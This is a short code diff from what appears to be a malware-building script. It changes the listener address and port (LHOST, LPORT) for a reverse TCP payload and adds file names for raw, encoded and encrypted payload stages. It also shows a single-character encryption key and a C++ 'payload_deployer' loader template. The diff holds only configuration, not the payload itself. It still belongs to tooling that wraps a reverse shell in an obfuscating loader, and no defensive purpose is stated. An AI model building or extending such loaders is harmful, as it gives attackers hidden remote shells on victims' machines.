@@ -2,14 +2,15 @@ from insert_code import insert_payload
 from encrypt import encrypt
 import subprocess as sb
 
-LHOST = '192.168.100.1'
+LHOST = '192.168.0.103'
 
-LPORT = '6942'
+LPORT = '9500'
 
 RAW_CODE_FILE = 'reverse_tcp_raw.txt'
 
-ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.txt'
+ENCODED_CODE_FILE = 'reverse_tcp_enc.txt'
 
+ENCRYPTED_CODE_FILE = "reverse_tcp_encr.txt"
 KEY = 'x'
 
 LOADER_TEMPLATE = 'payload_deployer.cpp.template'
